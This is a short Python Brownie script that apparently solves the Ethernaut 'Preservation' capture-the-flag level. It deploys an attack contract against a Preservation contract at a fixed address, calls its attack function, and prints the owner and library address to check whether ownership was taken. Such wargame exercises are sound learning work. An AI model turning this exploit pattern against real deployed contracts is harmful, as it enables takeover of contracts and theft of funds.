from scripts.helpful_scripts import POINT_ONE, TEN, get_account, ONE
from brownie import Preservation, LibraryContract, AttackPreservation, network, Contract
from web3 import Web3
from web3.auto import w3


def deploy_LibraryContract():
    account = get_account()
    lib = LibraryContract.deploy(
        {"from": account},
    )
    return lib


def deploy_Preservation(lib1, lib2):
    acc1 = get_account(index=1)
    preservation = Preservation.deploy(
        lib1,
        lib2,
        {"from": acc1},
    )
    return preservation


def deploy_AttackPreservation(preservation):
    account = get_account()
    attack = AttackPreservation.deploy(
        preservation,
        {"from": account},
    )
    return attack


def main():
    print(network.show_active())
    account = get_account()

    # lib1 = deploy_LibraryContract()
    # lib2 = deploy_LibraryContract()
    # preservation = deploy_Preservation(lib1, lib2)

    preservation_address = "0xd6e3d2f4B97ec72a8723d89197c69487DE334609"
    preservation = Contract.from_abi(
        Preservation._name, preservation_address, Preservation.abi
    )

    attackContract = deploy_AttackPreservation(preservation)

    print(f"Owner? : {preservation.owner()}")
    print(f"Lib1 address? : {preservation.timeZone1Library()}")

    attackContract.attack({"from": account})
    print(f"Lib1 address? : {preservation.timeZone1Library()}")

    print(f"Owner? : {preservation.owner()}")
